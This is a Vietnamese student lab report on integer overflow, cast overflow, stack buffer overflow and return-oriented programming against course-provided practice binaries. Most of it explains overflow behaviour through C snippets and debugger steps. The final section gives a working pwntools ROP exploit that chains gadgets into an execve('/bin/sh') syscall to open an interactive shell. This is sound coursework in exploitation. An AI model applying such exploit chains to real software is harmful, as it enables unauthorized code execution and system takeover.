---
title: Lab 5 - Integer Overflow và ROP - Nhóm 2

---

# Lab 5 - Integer Overflow và ROP - Nhóm 2

> GVHD: Nguyễn Hữu Quyền
> Mã môn: NT521.P11.ANTN.1


| **Thành viên**          | **MSSV**    |
|--------------------|----------|
| Vũ Ngọc Quốc Khánh | 22520661 |
| Nguyễn Đức Luân    | 22520825 |
| Đào Hoàng Phúc     | 22521110 |
## Yêu cầu 1
### Đề bài:
Sinh	viên	chạy	thử	trường	hợp	tràn	trên	và	giải	thích	kết	quả	thu	được?	
Vì	sao	ta	có	được	giá	trị	đó?	Tràn	trên	xảy	ra	khi	nào?
### Các bước thực hiện:
Chạy code C 
```cpp=
#include <stdio.h>
int main()
{
    short int a;
    unsigned short int b;
    a = 0x7fff,	
    b = 0xffff;
    printf("%#x +1 = %d + 1 = %hd\n%#x + 1 =  ╕%d + 1 = %hu\n",a, a,a +1,b,b, b+1);   
}
```

Kết quả chạy code ta thu được
![image](https://hackmd.io/_uploads/rJhNktlf1e.png)

Giải thích: 
- **short int 0x7fff**:
Xảy ra hiện tượng tràn số vì tối đa của kiểu dữ liệu short int là 0x7fff, khi cộng 1 vào số này thì sẽ thành 0x8000, đổi qua nhị phân là 1000 0000 0000 0000 và đây là kiểu có dấu nên nó đang được biểu diễn ở dạng bù 2, và giá trị bù 2 ở đây là của -32768
- **unsigned short int 0xffff**:
Xảy ra hiện tượng tràn số vì tối đa của kiểu dữ liệu unsigned short int là 0xffff, biểu diễn ở dạng nhị phân của số này là 1111 1111 1111 1111, và khi cộng 1 vào nó sẽ thành 1 0000 0000 0000 0000, và đây là số không dấu nên không có số âm, và vì chỉ lấy 16 bit đầu nên bit thứ 17 bị bỏ qua, cụ thể là bit 1, nên giá trị trả về là 0

## Yêu cầu 2
### Đề bài:
Sinh	viên	chạy	thử	trường	hợp	tràn	dưới	và	giải	thích	kết	quả	thu	được?	
Vì	sao	ta	có	được	giá	trị	đó?	Tràn	dưới	xảy	ra	khi	nào?
### Các bước thực hiện:
Chạy code C
```cpp=
#include <stdio.h>
int main()
{
    short int a;
    unsigned short int b;
    a = 0x8000,	b = 0x0000;
    
    printf("%#x - 1 = %d - 1 = %hd\n%#x - 1 =  %d - 1 = %hu\n",a, a,a -1,b,b, b-1);   

}
```




Sau chạy code ta thu được kết quả:
![image](https://hackmd.io/_uploads/SkBsRtgf1g.png)

Giải thích:
Kiểu dữ liệu short int có giới hạn dưới là 0x8000, khi thực hiện trừ 1 đi nó sẽ xảy ra tràn số, 1000 0000 0000 0000 - 1 = 0111 1111 1111 1111, giá trị này ở dạng bù 2 là +32767

Kiểu dữ liệu unsigned short int có giới hạn dưới là 0, khi thực hiện trừ 1 đi nó sẽ xảy ra tràn số, 0 - 1 = 1111 1111 1111 1111, và kiểu dữ liệu này không có số âm, nên giá trị này đổi sang giá trị dương là 65535
## Yêu cầu 3 
### Đề bài:
Với	data_len	nhập	vào	là	-1,	hàm	malloc()	sẽ	hiểu	đang	cần	cấp	phát	bao	
nhiêu	byte?	Read	sẽ	đọc	chuỗi	có	giới	hạn	là	bao	nhiêu	byte?	Vì	sao?
### Các bước thực hiện:
Chạy GDB với input là -1 :
- Ta thấy rằng input đầu vào của hàm `malloc` là 0xf, vì 0x10 -1 = 0xf, nên số byte được cấp phát là 15 bytes
![image](https://hackmd.io/_uploads/Hk8quYgz1e.png)
- Ta thấy rằng input thứ 3 của hàm `read` là 0xffffffff vì biến buf_len có kiểu dữ liệu int là kiểu có dấu, đây là biểu diễn bù 2 của -1, và tham số thứ 3 trong hàm `read` là kiểu dữ liệu là size_t, và đây là kiểu dữ liệu không dấu, nên nó sẽ nhận vào 0xffffffff như 1 giá trị không dấu là 4294967295, nên nó sẽ đọc bấy nhiêu bytes
![image](https://hackmd.io/_uploads/Skv0Ytgzyx.png)



## Yêu cầu 4:
### Đề bài:
Sinh	viên	thử	tìm	giá	trị	của	a	để	chương	trình	có	thể	in	ra	thông	báo	“OK!	Cast	overflow	done”?	Giải	thích?	
### Các bước thực hiện:
Thực hiện debug chương trình cast-overflow đến hàm scanf và thực hiện nhập input :
![image](https://hackmd.io/_uploads/Sy3l3deGJg.png)
Debug đến phần hàm main gọi hàm check:
![image](https://hackmd.io/_uploads/SybL3uezJx.png)

Ta thấy lúc này tham số nhập vào hàm check khác với input  lúc nhập vào:
![image](https://hackmd.io/_uploads/rkgj2dxM1l.png)

Lý do là vì input nhập vào chương trình có kiểu dữ liệu là long int (8 byte) còn tham số trong hàm check có kiểu dữ liệu là int (4byte) nên khi debug ta thấy hàm check chỉ lấy 4 byte cuối của input.

Để có thể in ra thông báo “OK! Cast overflow done” ta cần đảm bảo 4 byte cuối của input có giá trị là 0x00000000.

Vậy input sẽ có format như sau 0x**A**00000000 (với A là giá trị tùy ý miễn không vượt quá giới hạn giá trị cho phép của biến long int)

Ta thử mẫu input là 0x200000000 tương ứng với 8589934592 (hệ cơ số 10):

![image](https://hackmd.io/_uploads/BkXN0dgzye.png)

Ta thử mẫu input là 0xAB00000000 tương ứng với 734439407616 (hệ cơ số 10):
![image](https://hackmd.io/_uploads/rJ1cAOlM1g.png)

## Yêu cầu 5:
### Đề bài:
Sinh	viên	khai	thác	lỗ	hổng	stack	overflow	của	file	thực	thi	vulnerable,	điều	hướng	chương	trình	thực	thi	hàm	success.	Báo	cáo	chi	tiết	các	bước	thực	hiện.
### Các bước thực hiện:
Thực hiện debug chương trình vulnerable để tìm địa chỉ hàm sucess:
![image](https://hackmd.io/_uploads/Bkkuatlf1l.png)
Ta có địa chỉ hàm success : **0x0804846b**

Debug chương trình tìm địa chỉ bắt đầu lưu input:
![image](https://hackmd.io/_uploads/rkdf0txzJe.png)
![image](https://hackmd.io/_uploads/HkPVRtgzkl.png)
Ta có địa chỉ bắt đầu lưu input là **0xffffcda4**.

Tìm địa chỉ lưu eip trong stack:

![image](https://hackmd.io/_uploads/H1Bq0Klzke.png)

Tính khoảng cách giữa địa chỉ lưu input và địa chỉ lưu eip:
![image](https://hackmd.io/_uploads/r1Jlk5xfye.png)

Ta có payload như sau:
![image](https://hackmd.io/_uploads/HJBGkqezyg.png)

Kiểm tra kết quả:
![image](https://hackmd.io/_uploads/rybU1cezkx.png)








## Yêu cầu 6
### Đề bài
Sinh viên tự tìm hiểu và giải thích ngắn gọn về: procedure linkage table và Global Offset Table trong ELF Linux.
### Trả lời
* PLT (Procedure Linkage Table) chứa các lời gọi hàm của chương trình. PLT sẽ gửi lại các địa chỉ tuyệt đối của hàm
* GOT (Global Offset Table) là bảng lưu trữ địa chỉ của các biến và hàm được liên kết động.
**Ví dụ**

## Yêu cầu 7
### Đề bài
Sinh viên khai thác lỗ hổng stack overflow trong file rop để mở shell tương tác
### Các bước thực hiện
Sử dung ROPgadget để tìm hiểu về các gadget pop và ret liên quan đến eax
![image](https://hackmd.io/_uploads/BkXRGteGJx.png)
lệnh `pop eax ; ret` nằm ở địa chỉ `0x080bb196`.

Tiếp tục tìm hiểu các gadget liên quan đến ebx
![image](https://hackmd.io/_uploads/BkllBtgfkg.png)
ta nhận thấy ở địa chỉ `0x0806eb90` có cả pop edx, ecx và ebx.

Tiếp tục tìm địa chỉ của chuỗi `/bin/sh`
![image](https://hackmd.io/_uploads/SkAhrYgfkl.png)
Địa chỉ của `/bin/sh` là `0x080be408`

Tiếp tục tìm gadget của 0x80
![image](https://hackmd.io/_uploads/HydX8Klfye.png)
`0x08049421` là địa chỉ của 0x80

![image](https://hackmd.io/_uploads/Sy3KvYxzke.png)
Dựa theo hình trên, để có thể thực thi được lệnh `sys_execve("/bin/sh)"` nhưng thực chất là lệnh `sys_execve("/bin/sh, NULL, NULL)"`. Ta phải để các giá trị các thanh ghi như sau:
|Thanh ghi|Giá trị|Mô tả|
|:-:|:-:|:-:|
|eax|0xB|Giá trị system call của `sys_execve()`|
|ebx|"/bin/sh"|Tham số thứ nhất của hàm|
|ecx|0|Tham số thứ hai của hàm có giá trị là NULL|
|edx|0|Tham số thứ ba của hàm có giá trị là NULL|

Ta đi tìm return address để ghi đè. Khi disassemble, đặt breakpoint ở hàm gets
![image](https://hackmd.io/_uploads/SkYDFYlzyx.png)
![image](https://hackmd.io/_uploads/HyaRqteMyx.png)
Buffer bắt đầu ở đầu ở `0xffffcbfc`
![image](https://hackmd.io/_uploads/r1k-hFef1l.png)
eip ở `0xffffcc6c`, từ đó ta cần truyền 112 bytes để ghi đè. Từ đó ta tổng hợp thành code exploit
```python
from pwn import *
sh = process('./rop')
pop_eax_ret = 0x080bb196 # change to correct address
pop_edcb_ret = 0x0806eb90 # change to correct address
int_0x80 = 0x08049421 # change to correct address
binsh_ret = 0x080be408 # change to correct address
payload = b'a' * 112 # padding to overflow
payload += p32(pop_eax_ret) # overwrite ret addr with addr of the first gadget
payload += p32(0x0b) # should be value for register in gadget
# add more infor to complete your payload
payload += p32(pop_edcb_ret)
payload += p32(0x0)
payload += p32(0x0)
payload += p32(binsh_ret)
payload += p32(int_0x80)
## send payload
sh.sendline(payload)
sh.interactive()
```
![image](https://hackmd.io/_uploads/Hk3-6Kgfyl.png)

Exploit thành công
